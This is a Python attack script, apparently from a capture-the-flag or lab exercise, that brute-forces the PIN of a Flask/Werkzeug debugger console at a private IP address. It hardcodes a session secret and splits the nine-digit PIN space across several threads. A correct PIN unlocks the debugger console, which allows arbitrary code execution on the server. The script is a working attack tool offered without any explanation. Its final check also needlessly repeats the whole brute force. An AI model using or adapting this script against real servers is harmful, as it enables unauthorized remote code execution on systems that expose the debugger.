import threading
import time
import requests as req
def check_auth(response):
  return '"auth": false' not in response

def fer_threaded(start, end):
  secret = 'IFBLDjzpiZAnv5Bj60Hx'
  for data in range(start, end):
    data = str(data)
    pin = data[:3] + "-" + data[3:6] + "-" + data[6:]
    print('Trying Pin: ' + pin)
    url = f"http://172.31.69.87:5000/console"
    parm = f"__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}"
    res = req.get(url, params=parm)

    if check_auth(res.text):
      print('Found PIN:', pin)
      return pin

  return None

def main():
  threads = []
  # Adjust ranges and delay as needed
  ranges = [
    (100000000, 200000000),
    (200000000, 300000000),
    (300000000, 400000000),
    (400000000, 500000000),
    (500000000, 600000000),
    (600000000, 700000000),
    (700000000, 800000000),
    (800000000, 900000000),
    (900000000, 999999999),
  ]

  # Controlled concurrency with a loop and delay
  for start, end in ranges:
    thread = threading.Thread(target=fer_threaded, args=(start, end))
    threads.append(thread)
    thread.start()
    time.sleep(1)  # Adjust delay to control request frequency

  # Wait for all threads to finish
  for thread in threads:
    thread.join()

  # Check if any PIN was found (optional)
  found_pin = any(resp is not None for resp in [fer_threaded(r[0], r[1]) for r in ranges])
  if found_pin:
    print('Found PIN(s)')
  else:
    print('No PIN found in the given ranges')

if __name__ == '__main__':
  main()

